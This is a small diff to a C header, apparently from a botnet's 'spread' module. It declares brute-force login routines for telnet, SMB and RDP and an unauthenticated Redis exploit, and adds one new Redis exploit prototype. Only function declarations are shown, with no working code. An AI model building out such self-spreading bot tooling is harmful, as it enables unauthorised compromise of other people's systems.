@@ -62,5 +62,5 @@ int try_login_telnet(const char *ip, uint16_t port, const char *user, const char
 int try_login_smb(const char *ip, uint16_t port, const char *user, const char *pass);
 int try_login_rdp(const char *ip, uint16_t port, const char *user, const char *pass);
 int exploit_redis_unauth(notnet_bot_t *bot, const char *ip, uint16_t port);
-
+int exploit_redis_sock(notnet_bot_t *bot, int sock);
 #endif /* NOTNET_SPREAD_H */
